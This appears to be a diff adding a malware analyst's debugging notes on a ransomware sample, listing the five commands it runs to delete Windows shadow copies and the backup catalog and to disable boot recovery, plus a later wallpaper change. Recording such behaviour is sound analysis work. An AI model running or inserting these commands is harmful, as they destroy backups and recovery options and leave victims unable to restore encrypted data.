@@ -1,0 +1,14 @@
+# x64dbg live — WinExec commands (PID 960, VM debug)
+# Order matches sub_1400130E0 / sub_140013220 (obfuscated strings).
+
+1. vssadmin delete shadows /all /quiet
+2. wmic shadowcopy delete
+3. wbadmin delete catalog -quiet
+4. bcdedit /set {default} recoveryenabled No
+5. bcdedit /set {default} bootstatuspolicy ignoreallfailures
+
+# Next hit: kernel32!GetLogicalDrives (start of drive walk).
+# Walk was skipped (RAX=0) to avoid mass encryption on the debug VM.
+# Then user32!SystemParametersInfoA(SPI_SETDESKWALLPAPER=0x14,
+#   path=C:\Users\petik\AppData\Local\Temp\~umbra_wp.bmp, fWinIni=3).
+# Process then exited (NO_TARGET). GUI / self-delete WinExec not captured.
